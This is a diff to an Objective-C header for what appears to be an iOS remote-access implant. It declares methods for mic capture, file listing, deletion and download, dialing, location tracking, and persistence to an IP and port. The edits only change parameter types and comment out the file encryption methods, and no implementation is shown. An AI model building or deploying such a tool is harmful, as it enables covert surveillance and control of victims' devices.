@@ -41,15 +41,15 @@ extern int sockfd;
 -(void)captureWithBlock:(void(^)(NSData* imageData))block;
 
 //mic
--(void)mic:(NSArray *)args;
+-(void)mic:(NSString *)arg;
 //file management
--(void)directoryList:(NSArray *)args;
--(void)rmFile:(NSArray *)args;
--(void)changeWD:(NSArray *)args;
+-(void)directoryList:(NSString *)arg;
+-(void)rmFile:(NSString *)arg;
+-(void)changeWD:(NSString *)arg;
 -(void)sendEncryptedFile:(NSData *)fileData;
--(void)download:(NSArray *)args;
--(void)encryptFile:(NSArray *)args;
--(void)decryptFile:(NSArray *)args;
+-(void)download:(NSString *)arg;
+//-(void)encryptFile:(NSString *)arg;
+//-(void)decryptFile:(NSString *)arg;
 
 //misc
 extern int SBSLaunchApplicationWithIdentifier(CFStringRef identifier, Boolean suspended);
@@ -59,17 +59,17 @@ extern CFStringRef SBSApplicationLaunchingErrorString(int error);
 -(void)vibrate;
 -(void)say:(NSString *)string;
 -(void)displayalert:(const char *)title :(const char *)message;
--(void)alert:(NSArray *)cmdarray;
+-(void)alert:(NSArray *)args;
 -(void)getPid;
--(void)openURL:(NSArray *)args;
--(void)dial:(NSArray *)args;
--(void)setVolume:(NSArray *)args;
+-(void)openURL:(NSString *)arg;
+-(void)dial:(NSString *)arg;
+-(void)setVolume:(NSString *)arg;
 -(void)getVolume;
 -(void)isplaying;
 -(void)listapps;
 -(NSString *)battery;
 -(void)sysinfo;
--(void)launchApp:(NSArray *)args;
+-(void)launchApp:(NSString *)arg;
 -(void)persistence:(NSString *)ip :(int)port;
 -(void)rmpersistence;
 
@@ -77,7 +77,7 @@ extern CFStringRef SBSApplicationLaunchingErrorString(int error);
 -(void)upload:(NSString *)uploadpath;
 -(void)mcSendNoReply:(NSString *)command;
 -(void)mcSendYesReply:(NSString *)command;
--(void)locationService:(NSArray *)args;
+-(void)locationService:(NSString *)arg;
 
 @end
 
